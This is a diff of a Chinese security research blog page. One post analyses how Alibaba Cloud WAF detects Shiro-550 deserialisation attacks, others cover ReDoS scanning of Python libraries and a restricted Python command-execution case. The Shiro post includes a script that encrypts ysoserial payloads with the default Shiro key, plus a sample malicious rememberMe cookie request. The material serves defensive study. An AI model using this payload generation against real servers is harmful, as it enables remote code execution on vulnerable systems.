@@ -447,108 +447,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/" class="post-title-link" itemprop="url">从shiro-550漏洞品阿里云waf规则引擎</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。</p>
-<p>也有人整理出常见的aes加密密钥 top100 来利用此漏洞。</p>
-<p>如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：</p>
-<ol>
-<li>根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截</li>
-<li>先base64解码，然后aes解密，最后规则匹配原始payload</li>
-</ol>
-<p>第二个方法存在两个问题：</p>
-<ol>
-<li><p>aes解密时密钥是啥？会把top100利用时的密钥全部覆盖？</p>
-</li>
-<li><p>这个方法想起来简单，但是实施起来并不简单。它需要规则引擎支持base64解码和aes解密，并且需要规则中能够很容易描述这个解码顺序。</p>
-<p> 按照我的理解，waf和poc扫描的规则引擎类似，都支持规则描述文件和代码实现方式两种。如果waf规则引擎只支持规则描述文件的形式，不支持用代码来描述防护规则，那写这么一条规则我觉得还挺费劲的。</p>
-</li>
-</ol>
-<p>下面就是我验证阿里云waf是怎么拦截防护shiro-550漏洞的。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>测试payload使用下面脚本生成，其中key使用shiro-550默认key</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Python2</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">BS &#x3D; AES.block_size</span><br><span class="line">mode &#x3D; AES.MODE_CBC</span><br><span class="line">iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s): return s + ((BS - len(s) % BS)</span><br><span class="line">                    * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_shiro_payload(rememberMe):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	打印 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;&quot; 生成的payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	# rememberMe &#x3D; &quot;&quot;&quot;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxq&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; encryptor.decrypt(base64.b64decode(rememberMe))</span><br><span class="line">	print(data)</span><br><span class="line">	print(len(data))</span><br><span class="line"></span><br><span class="line">def encrypt_shiro_payload(originalPayload):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	originalPayload 是 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;http:&#x2F;&#x2F;xxx&quot; 生成的payload</span><br><span class="line"></span><br><span class="line">	打印payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	data &#x3D; base64.b64encode(encryptor.encrypt(pad(originalPayload)))</span><br><span class="line">	print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	encrypt_shiro_payload(&quot;111111&quot;*400)</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p>测试攻击请求</p>
-<p> 原始payload是利用ysoerial工具生成： java8 -jar scripts/third_party/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS “”</p>
-<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密→base64编码</p>
-<p> 发送请求后，阿里云waf拦截</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx.com</span><br><span class="line">User-Agent: curl&#x2F;7.70.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: rememberMe&#x3D;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxp</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>测试正常请求</p>
-<p> 原始payload是 “111111”*400 ，不包含攻击特征。</p>
-<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码</p>
-<p> 结论：正常请求阿里云waf未拦截</p>
-</li>
-</ol>
-<p>对比拦截和不拦截的情况，可以看出来阿里云waf防护防护规则逻辑：先对cookie中的rememberMe做base64解码，然后用默认key(kPH+bIxk5D2deZiIxcaaaA==”) 来做aes解密，最后规则匹配解密后的内容。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有一些测试在分析过程中没有写，这里直接写出结论：</p>
-<ol>
-<li>阿里云waf仅尝试使用一个默认key来解密。（应该是性能考虑）</li>
-<li>不能根据rememberMe的值过长来拦截，因为正常业务这个值也可能有500+个字节长度。</li>
-</ol>
-<p>虽然不能完全防御shiro-100key扫描，但是阿里云waf这条规则还是挺细致的。从支持rsa解密这一点上感觉背后的规则引擎功能很丰富。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%80%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -695,6 +593,108 @@
 </ul>
 <h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>所以，现在你清楚怎么绕过shiro漏洞的防护了么？</p>
 <p>另外，如果读者有第二种情况绕过的案例，欢迎公众号后台私信我。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/" class="post-title-link" itemprop="url">从shiro-550漏洞品阿里云waf规则引擎</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。</p>
+<p>也有人整理出常见的aes加密密钥 top100 来利用此漏洞。</p>
+<p>如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：</p>
+<ol>
+<li>根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截</li>
+<li>先base64解码，然后aes解密，最后规则匹配原始payload</li>
+</ol>
+<p>第二个方法存在两个问题：</p>
+<ol>
+<li><p>aes解密时密钥是啥？会把top100利用时的密钥全部覆盖？</p>
+</li>
+<li><p>这个方法想起来简单，但是实施起来并不简单。它需要规则引擎支持base64解码和aes解密，并且需要规则中能够很容易描述这个解码顺序。</p>
+<p> 按照我的理解，waf和poc扫描的规则引擎类似，都支持规则描述文件和代码实现方式两种。如果waf规则引擎只支持规则描述文件的形式，不支持用代码来描述防护规则，那写这么一条规则我觉得还挺费劲的。</p>
+</li>
+</ol>
+<p>下面就是我验证阿里云waf是怎么拦截防护shiro-550漏洞的。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>测试payload使用下面脚本生成，其中key使用shiro-550默认key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Python2</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">BS &#x3D; AES.block_size</span><br><span class="line">mode &#x3D; AES.MODE_CBC</span><br><span class="line">iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s): return s + ((BS - len(s) % BS)</span><br><span class="line">                    * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_shiro_payload(rememberMe):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	打印 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;&quot; 生成的payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	# rememberMe &#x3D; &quot;&quot;&quot;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxq&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; encryptor.decrypt(base64.b64decode(rememberMe))</span><br><span class="line">	print(data)</span><br><span class="line">	print(len(data))</span><br><span class="line"></span><br><span class="line">def encrypt_shiro_payload(originalPayload):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	originalPayload 是 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;http:&#x2F;&#x2F;xxx&quot; 生成的payload</span><br><span class="line"></span><br><span class="line">	打印payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	data &#x3D; base64.b64encode(encryptor.encrypt(pad(originalPayload)))</span><br><span class="line">	print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	encrypt_shiro_payload(&quot;111111&quot;*400)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>测试攻击请求</p>
+<p> 原始payload是利用ysoerial工具生成： java8 -jar scripts/third_party/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS “”</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密→base64编码</p>
+<p> 发送请求后，阿里云waf拦截</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx.com</span><br><span class="line">User-Agent: curl&#x2F;7.70.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: rememberMe&#x3D;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxp</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试正常请求</p>
+<p> 原始payload是 “111111”*400 ，不包含攻击特征。</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码</p>
+<p> 结论：正常请求阿里云waf未拦截</p>
+</li>
+</ol>
+<p>对比拦截和不拦截的情况，可以看出来阿里云waf防护防护规则逻辑：先对cookie中的rememberMe做base64解码，然后用默认key(kPH+bIxk5D2deZiIxcaaaA==”) 来做aes解密，最后规则匹配解密后的内容。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有一些测试在分析过程中没有写，这里直接写出结论：</p>
+<ol>
+<li>阿里云waf仅尝试使用一个默认key来解密。（应该是性能考虑）</li>
+<li>不能根据rememberMe的值过长来拦截，因为正常业务这个值也可能有500+个字节长度。</li>
+</ol>
+<p>虽然不能完全防御shiro-100key扫描，但是阿里云waf这条规则还是挺细致的。从支持rsa解密这一点上感觉背后的规则引擎功能很丰富。</p>
 
       
     </div>
@@ -964,6 +964,188 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%BA%93%E7%9A%84ReDos%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-Python%E5%BA%93%E7%9A%84ReDos%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/" class="post-title-link" itemprop="url">Python库的ReDos漏洞检测</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>  之前分析了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jw0vPIvgCdt1090j3-Sxqw">正则表达式原理与ReDos攻击</a>，最近尝试检测Python常用库是否存在ReDos问题。</p>
+<p>  我的思路是：</p>
+<ul>
+<li>先看看有没有人已经做过”挖掘常用库的ReDos”工作</li>
+<li>下载Python的常用库，写程序自动检测库中的ReDos问题</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="已有的研究"><a href="#已有的研究" class="headerlink" title="已有的研究"></a>已有的研究</h2><p>这篇2018年的论文<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2723">JavaScript Web服务器ReDoS漏洞分析</a>中</p>
+<p>研究人员先下载了热门的npm模块，然后提取正则表达式，最后测试正则表达式是否存在漏洞。最终发现存在ReDos漏洞的库影响超过339个主流网站。</p>
+<p>其中的一点细节：</p>
+<ul>
+<li>通过遍历JavaScript代码的AST提取正则表达式<ul>
+<li>traversing the abstract syntax trees of the JavaScript code</li>
+<li>removing regular expressions that contain no repetitions</li>
+</ul>
+</li>
+<li>半人工地测试正则表达式是否存在漏洞</li>
+</ul>
+<h2 id="检测Python常用库的ReDos问题"><a href="#检测Python常用库的ReDos问题" class="headerlink" title="检测Python常用库的ReDos问题"></a>检测Python常用库的ReDos问题</h2><p>检测目标（基本都是我之前写Python项目时装的一些库）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flask</span><br><span class="line">django</span><br><span class="line">bottle</span><br><span class="line">scikit-learn</span><br><span class="line">pymysql</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>用Python的<code>ast</code>模块解析出库里Python代码中所有的字符串常量，把这些字符串常量都当作正则字符串，最后用<a target="_blank" rel="noopener" href="https://github.com/superhuman/rxxr2">rxxr2</a>工具检测是否存在ReDos问题。</p>
+<p>代码见 <a target="_blank" rel="noopener" href="https://github.com/leveryd/regex_test/blob/master/find_vuln_pattern.py">find_vuln_pattern.py</a> 文件</p>
+<h3 id="检出结果"><a href="#检出结果" class="headerlink" title="检出结果"></a>检出结果</h3><p>所有的漏洞结果在<a target="_blank" rel="noopener" href="https://github.com/leveryd/regex_test/blob/master/results/RESULTS.md">RESULTS.md</a>，验证了部分结果，提交了三个issue。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/scikit-learn/scikit-learn/issues/19522">https://github.com/scikit-learn/scikit-learn/issues/19522</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PyMySQL/PyMySQL/issues/967">https://github.com/PyMySQL/PyMySQL/issues/967</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/scrapinghub/dateparser/issues/869">https://github.com/scrapinghub/dateparser/issues/869</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次测试过程中，存在一些问题：</p>
+<ul>
+<li>常用库收集得并不多</li>
+<li>rxxr2工具也有误报和漏报的情况<ul>
+<li>Python正则中会有<code>?P&lt;major&gt;</code>命名组的写法，因为rxxr2不能处理这种特殊情况，所以可能会产生漏报；</li>
+<li>部分正则使用非贪婪匹配时，似乎无法产生ReDos效果，会产生误报</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/" class="post-title-link" itemprop="url">Python命令执行Case</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在一次安全评估过程中，遇到了一个命令执行的点，但是存在部分限制。</p>
+<p>服务是用Python写的，漏洞点的代码精简一下大概如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;&quot;   # 用户可控</span><br><span class="line">user_input_function &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">user_input_argument &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())   # 第二个参数必须存在</span><br></pre></td></tr></table></figure>
+
+<p>大概就是 <code>任意模块.任意函数(任意字符串,不可控的实例参数)</code> 。</p>
+<p>因为第二个参数必须存在，所以不能简单的调用 <code>os.system</code>函数来执行命令。</p>
+<p>我的想法就变成，怎么找到一个方法能够执行命令，且这个方法有两个参数，且第二个参数不影响命令执行。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>想到去遍历Python库，来看看有没有满足上述条件的方法。</p>
+<p>于是写了一小段代码来遍历Python默认安装的所有模块，扔给指定参数来尝试调用模块中的方法。如果没有报错，就打印函数后人工排查一下。</p>
